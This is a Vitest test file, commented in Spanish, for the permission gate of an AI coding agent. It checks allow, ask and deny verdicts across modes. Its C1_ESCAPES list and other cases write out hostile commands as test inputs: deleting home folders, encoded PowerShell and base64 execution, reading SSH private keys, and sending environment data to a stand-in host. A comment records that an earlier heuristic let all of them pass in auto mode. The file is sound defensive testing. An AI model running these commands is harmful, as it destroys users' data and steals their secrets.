import { describe, expect, it } from 'vitest';
import { createRuntimeGate, decidePermission, isContainedCommand, referencesOutside } from './permissionGate';
import type { RuntimePermissionMode } from './runtimeSession';
import type { ToolKind } from './agentLoop';

const SCOPE = { cwd: '/proj', extraDirs: [], platform: 'linux' };
const WIN = { cwd: 'C:\\proj\\app', extraDirs: [], platform: 'win32' };
const MODES: RuntimePermissionMode[] = ['plan', 'default', 'acceptEdits', 'auto', 'bypassPermissions'];
const KINDS: ToolKind[] = ['read', 'edit', 'exec'];

// Tabla esperada DENTRO del cwd (exec con un comando local inocuo).
const INSIDE: Record<RuntimePermissionMode, Record<ToolKind, string>> = {
  plan: { read: 'allow', edit: 'deny', exec: 'deny' },
  default: { read: 'allow', edit: 'ask', exec: 'ask' },
  acceptEdits: { read: 'allow', edit: 'allow', exec: 'ask' },
  auto: { read: 'allow', edit: 'allow', exec: 'allow' },
  bypassPermissions: { read: 'allow', edit: 'allow', exec: 'allow' },
};

// Los escapes medidos en la revision (C1, cwd = C:\proj\app): con la heuristica anterior, todos salian
// `allow` en Auto. Con la lista blanca, todos preguntan.
const C1_ESCAPES = [
  'rm -rf $HOME/',
  'rm -rf "$HOME"',
  'rm -rf ${HOME}',
  'Remove-Item -Recurse -Force $env:USERPROFILE',
  'Remove-Item -Recurse -Force $env:USERPROFILE\\Documents',
  'rmdir %USERPROFILE%\\Documents',
  'cd; rm -rf *',
  'cd C:; rm -rf *',
  'Get-ChildItem -Recurse C: | Remove-Item',
  'format D:',
  'powershell -EncodedCommand ZQBjAGgAbwA=',
  'bash -c "$(echo ZWNobw== | base64 -d)"',
  'git -C . push --force',
  'git -c a=b push',
  "node -e \"fetch('https://x.example/'+process.env.PATH)\"",
  "(New-Object Net.WebClient).DownloadString('https://x.example')",
  'certutil -urlcache -f http://x.example/a a',
  'git reset --hard',
  'rm -rf .git',
  'cat $HOME/.ssh/id_rsa',
  'del /s /q %USERPROFILE%\\x',
  'rm -rf ~',
  'cd ..; rm -rf *',
  'cd ..\\..',
  'echo x > ..\\..\\x',
  'echo x > C:\\Windows\\x',
  'curl https://x.example',
  'type \\\\host\\share\\x',
  'cat <(curl x.example)',
  'find . -delete',
];

describe('decidePermission', () => {
  it('decide_fullTableInside_matchesSpec', () => {
    for (const mode of MODES) {
      for (const kind of KINDS) {
        const verdict = decidePermission({ mode, kind, pathClass: kind === 'exec' ? null : 'inside', target: null, command: kind === 'exec' ? 'ls src' : null, scope: SCOPE });
        expect(verdict.verdict, `${mode}/${kind}`).toBe(INSIDE[mode][kind]);
      }
    }
  });

  it('decide_outsidePath_asksInEveryModeButPlanDeniesEdits', () => {
    for (const mode of MODES) {
      for (const kind of ['read', 'edit'] as const) {
        const verdict = decidePermission({ mode, kind, pathClass: 'outside', target: '/etc/x', command: null, scope: SCOPE });
        const expected = mode === 'plan' && kind === 'edit' ? 'deny' : 'ask';
        expect(verdict.verdict, `${mode}/${kind}`).toBe(expected);
      }
    }
  });

  it('decide_outsidePath_marksRequestAsOutside', () => {
    expect(decidePermission({ mode: 'default', kind: 'read', pathClass: 'outside', target: '/etc/x', command: null, scope: SCOPE })).toEqual({
      verdict: 'ask',
      outside: 'Fuera del proyecto: /etc/x',
    });
  });

  it('decide_planDeny_givesReason', () => {
    expect(decidePermission({ mode: 'plan', kind: 'edit', pathClass: 'inside', target: null, command: null, scope: SCOPE })).toEqual({ verdict: 'deny', reason: 'modo Plan: solo lectura' });
  });

  it('decide_autoNetworkCommand_asksMarkedAsNetwork', () => {
    expect(decidePermission({ mode: 'auto', kind: 'exec', pathClass: null, target: null, command: 'curl https://x.com', scope: SCOPE })).toEqual({
      verdict: 'ask',
      outside: 'Red: curl https://x.com',
    });
  });

  it('decide_autoOpaqueExec_asks', () => {
    expect(decidePermission({ mode: 'auto', kind: 'exec', pathClass: null, target: null, command: null, scope: SCOPE })).toEqual({ verdict: 'ask' });
  });

  it('decide_autoWin32Escapes_allAsk', () => {
    const verdicts = C1_ESCAPES.map((command) => [command, decidePermission({ mode: 'auto', kind: 'exec', pathClass: null, target: null, command, scope: WIN }).verdict]);

    expect(verdicts).toEqual(C1_ESCAPES.map((command) => [command, 'ask']));
  });

  it('decide_bypassBashOutsidePath_asks', () => {
    const outside = ['rm -rf C:\\Users\\x', 'Remove-Item -Recurse $env:USERPROFILE', 'rm -rf ~/x', 'cd; rm -rf *', 'rm -rf ..\\otro'];

    const verdicts = outside.map((command) => decidePermission({ mode: 'bypassPermissions', kind: 'exec', pathClass: null, target: null, command, scope: WIN }).verdict);

    expect(verdicts).toEqual(outside.map(() => 'ask'));
  });

  it('decide_bypassBashInsideOrNetwork_allows', () => {
    const allowed = ['rm -rf dist', 'curl https://x.example', 'rm -rf C:\\proj\\app\\out'];

    const verdicts = allowed.map((command) => decidePermission({ mode: 'bypassPermissions', kind: 'exec', pathClass: null, target: null, command, scope: WIN }).verdict);

    expect(verdicts).toEqual(allowed.map(() => 'allow'));
  });
});

describe('isContainedCommand', () => {
  it('contained_whitelistedCommands_true', () => {
    const commands = ['ls -la', 'cat src/a.ts', 'pnpm test', 'pnpm run build 2>&1', 'git status', 'git log --oneline -5', 'git diff -- src', 'npm test', 'cd src && ls', 'Get-ChildItem src | Select-Object Name', 'tsc --noEmit'];

    expect(commands.map((c) => [c, isContainedCommand(c, WIN)])).toEqual(commands.map((c) => [c, true]));
  });

  it('contained_networkOrOutsideOrUnknown_false', () => {
    const commands = ['git push origin main', 'npm install left-pad', 'cat /etc/passwd', 'rm -rf ../otro', 'ls ~/.ssh', 'npx cowsay', 'wget x', 'node scripts/x.mjs', 'yarn', 'cd', 'cd -', 'rg --pre sh x'];

    expect(commands.map((c) => [c, isContainedCommand(c, SCOPE)])).toEqual(commands.map((c) => [c, false]));
  });

  it('contained_null_false', () => {
    expect(isContainedCommand(null, SCOPE)).toBe(false);
  });
});

describe('referencesOutside', () => {
  it('references_homeVariablesAndDrives_true', () => {
    const commands = ['echo $HOME', 'echo ${USERPROFILE}', 'dir $env:APPDATA', 'dir %LOCALAPPDATA%', 'dir C:', 'ls ~', 'cd', 'ls ..', 'ls \\\\srv\\c$'];

    expect(commands.map((c) => [c, referencesOutside(c, WIN)])).toEqual(commands.map((c) => [c, true]));
  });

  it('references_insidePathsAndUrls_false', () => {
    const commands = ['ls src\\a', 'cat C:\\proj\\app\\x.txt', 'git log --format=%H', 'curl https://x.example/a/b', 'echo $f'];

    expect(commands.map((c) => [c, referencesOutside(c, WIN)])).toEqual(commands.map((c) => [c, false]));
  });
});

describe('createRuntimeGate', () => {
  it('gate_readOutsideCwd_asks', () => {
    const gate = createRuntimeGate(SCOPE);

    expect(gate({ id: '1', name: 'Read', kind: 'read', input: { file_path: '/etc/hosts' } }, 'bypassPermissions')).toEqual({ verdict: 'ask', outside: 'Fuera del proyecto: /etc/hosts' });
  });

  it('gate_bashWhitelistedInAuto_allows', () => {
    const gate = createRuntimeGate(SCOPE);

    expect(gate({ id: '1', name: 'Bash', kind: 'exec', input: { command: 'pnpm test' } }, 'auto')).toEqual({ verdict: 'allow' });
  });

  it('glob_patternWithParentSegments_asks', () => {
    const gate = createRuntimeGate(WIN);
    const patterns = ['../*.txt', '../**/*.txt', 'C:/Users/u/.ssh/*', '~/.ssh/*', 'src/../../x/*', '/etc/*'];

    const verdicts = patterns.map((pattern) => gate({ id: '1', name: 'Glob', kind: 'read', input: { pattern } }, 'default').verdict);

    expect(verdicts).toEqual(patterns.map(() => 'ask'));
  });

  it('grep_globOutsideCwd_asks', () => {
    const gate = createRuntimeGate(WIN);

    expect(gate({ id: '1', name: 'Grep', kind: 'read', input: { pattern: 'KEY', glob: '../../**/.env' } }, 'plan').verdict).toBe('ask');
  });

  it('glob_patternInside_allows', () => {
    const gate = createRuntimeGate(WIN);

    expect(gate({ id: '1', name: 'Glob', kind: 'read', input: { pattern: 'src/**/*.ts' } }, 'default')).toEqual({ verdict: 'allow' });
  });
});
